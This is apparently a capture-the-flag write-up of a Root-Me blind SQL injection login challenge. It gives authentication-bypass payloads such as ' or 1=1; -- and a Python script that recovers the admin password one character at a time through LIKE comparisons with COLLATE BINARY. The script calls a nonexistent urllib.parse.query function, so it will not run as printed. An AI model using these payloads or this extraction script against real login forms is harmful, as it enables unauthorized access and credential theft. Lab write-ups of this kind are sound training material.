
-------

This challenge was simple in the request, but i came across some hurdles in the specific payloads to Boolean exfiltrate.

The challenge presented a simple sign in page with a username and password, it was clear it was injectable due to the fact that `' or 1=1; --` bypassed the checks.

First i tried to gain an understanding on the query by trying different payloads such as `admin' AND password='' or 1=1; --`. This returned true, but did not sign us in with Admin privileges (This is because of the or 1=1 comparison, this means it defaults the signing to the first index of the database).

I manage to determine the payload as `admin' AND password='' or 1=0`; This payload did not work, this confirmed that the application was acknowledging my statement and that i was injecting into a correct column.

Then i created a simple python script, this script:
- tested all characters against password, if true add to password
- tested again and again adding the next successful login until no characters worked.

###### Due to other challenges i have done, i was worried that the password was incorrect and it was not properly taking in bad characters and the URL encoding was not working. This was however not the case, and the `LIKE` comparison was not `Case Sensitve`. This meant that an "a" = "A" and since lowercase came first in the wordlist every character was lower, even though the actually password was not. Using a case-sensitive similar command, we got the password


The script:

```python
import requests
import string
import urllib.parse


URL = "http://challenge01.root-me.org/web-serveur/ch10/index.php" 
characters = string.digits + string.ascii_letters + "_@{}-/()!\"$=^[];:"

def main():
    password = ""
    while True:
        for i in string.printable:
            passwordAttempt = urllib.parse.query(password+i)
            data = {'username':f'admin\'AND password LIKE \'{passwordAttempt}%\' COLLATE BINARY; --', 'password':'filler'}
            print(f"Request Content = {data}")
            response = requests.post(URL,data=data)
            if 'admin' in response.text:
                password += i
                print(f'Password Starts With -> {password}')
                break
        else:
            print(f'Password is: {password}')
            quit()


if __name__ == "__main__":
    main()
          
```